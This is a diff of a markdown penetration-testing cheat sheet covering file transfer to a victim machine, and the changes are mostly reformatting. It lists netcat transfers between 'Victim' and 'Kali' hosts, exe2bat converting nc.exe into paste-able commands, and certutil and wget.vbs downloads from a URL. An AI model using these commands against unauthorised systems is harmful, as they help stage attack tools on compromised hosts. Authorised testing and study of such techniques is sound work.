@@ -77,27 +77,30 @@ msbuild [src.sln]
 ```
 scp user@hostname:/path/to/src user@hostname:/path/to/dst
 ```
+
 - Netcat
 ```
- # Victim
-nc -nvlp $RPORT > out.file
+nc -nvlp $RPORT > out.file # Victim
 
- # Kali
-nc -nv $RHOST $RPORT < in.file
+nc -nv $RHOST $RPORT < in.file 
 ```
+
 - exe2bat
 ```
  # Convert a windows executable to a copy and paste set of commands
 wine $(locate exe2bat.exe) nc.exe nc.txt
 ```
+
 - certutil.exe
 ```
 certutil.exe -urlcache -split -f “$URL” $FILENAME
 ```
+
 - [zip.vbs](assets/files/zip.vbs) <sup><sub>[[copy&paste](assets/files/zip.vbs.txt)]
 ```bash
 CScript zip.vbs $SRC $DEST
 ```
+
 - [wget.vbs](assets/files/wget.vbs) <sup><sub>[[copy&paste](assets/files/wget.vbs.txt)]
 ```bash
 CScript wget.vbs $SRC $DEST
